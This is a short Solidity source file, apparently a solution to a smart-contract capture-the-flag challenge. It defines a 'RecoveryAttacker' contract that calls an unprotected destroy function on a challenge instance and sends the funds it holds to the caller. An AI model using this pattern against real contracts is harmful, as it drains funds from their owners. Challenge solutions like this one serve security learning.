// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

interface IRecovery {
    function destroy(address payable _to) external;
}

contract RecoveryAttacker {
    address public challengeInstance;

    constructor(address _challengeInstance) {
        challengeInstance = _challengeInstance;
    }

    function attack() external {
        IRecovery(challengeInstance).destroy(payable(msg.sender));
    }
}